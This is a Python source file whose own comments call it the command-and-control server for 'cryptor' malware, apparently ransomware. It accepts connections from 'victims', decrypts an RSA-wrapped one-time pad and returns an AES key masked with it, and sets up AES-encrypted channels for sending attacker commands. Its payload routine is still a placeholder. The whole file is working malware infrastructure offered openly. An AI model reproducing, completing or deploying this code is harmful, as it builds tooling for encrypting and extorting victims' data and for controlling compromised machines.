#!/usr/bin/env python3
# Copyright (C) 2020  @Qu3b411
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# This will eventually be the command and control center for the cryptor malware
# the C2.py file being imported is automattically generated by the make file,
# this makes it easy to define variables at the start that do not need to be changed
# after everything is set up.

from C2 import *;
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
import socket
import base64

def applyOTP(OTP, KEY):
    return bytes(o ^ k for o, k in zip(OTP, KEY))

#with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
sock = socket.socket()
sock.bind(('127.0.0.1',PORT_SVR))
sock.listen(1)

######################################################################################
######################################################################################
#   Set up a class object, This class object will contain all elements for a         #
#   connection to be established and maintained. these objects will be contained     #
#   within a list of established connections, A listener thread will execute         #
#   attacker issued commands on the selected victim. an additional thread will be    #
#   established to process the list to get information on each connection, this      #
#                                                                                    #
#   constructs a victim object with the following attributes                         #
#   conn                                                                             #
#   addr                                                                             #
#   SessionKey                                                                       #
#   SessionIV                                                                        #
######################################################################################
######################################################################################
   

class victim(object):
    ######################################################################################
    ######################################################################################
    #               BEGIN CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                    #
    ######################################################################################
    ######################################################################################
    def __init__(self):
        self.conn, self.addr = sock.accept()
        print("C2 Server >> Victim",self.addr,'connected')
        OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        EncryptedOTP = self.conn.recv(OTPPacketLen)
        rsaKey = RSA.import_key(PRVKEY)
        cipher = PKCS1_v1_5.new(rsaKey)
        OTP = cipher.decrypt(EncryptedOTP,"failed")
        aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)      
        OTPencodedAESKey = applyOTP(OTP,aesKey)
        self.conn.send(OTPencodedAESKey);
        # initiate the session key
        SessionKeyPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        EncryptedKey = self.conn.recv(SessionKeyPacketLen)
        self.SessionKey = cipher.decrypt(EncryptedKey,"failed")
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        self.SessionIV = self.conn.recv(16);
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
    def payload(self):
        print("place holder")
 
    def secure_send(self,buf: bytes,length: int):
        # Synchronize Buffer
        self.conn.recv(1)
        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
        self.conn.send((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
        # Synchronize buffer
        self.conn.recv(1)
        ciphertext = sessionCipher.encrypt(buf);
        # send the cipher text back to the client
        # the session IV has allready been updated in this instance. 
        self.conn.send(ciphertext)
        self.SessionIV = self.conn.recv(16)
       
    def secure_recv(self):  
        sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
        msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False) 
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved")
            sys.exit(-1)
        MSG = self.conn.recv(msgSZ)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved")
            sys.exit(-1)    
        plaintext = sessionCipher.decrypt(MSG[16:])
        self.SessionIV = MSG[:16]
        return plaintext;

#victim();
######################################################################################
######################################################################################
#               END CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                      #
######################################################################################
######################################################################################
#               BEGIN SERVER/CLIENT COMMUNICATION ROUTINE                            #
######################################################################################
######################################################################################
# print(str(secure_recv()))
# print(str(secure_recv()))
# print(str(secure_recv()))
# secure_send(bytearray(b'hello world'),11)
# secure_send(bytearray(b'hello world this is the server'),30)

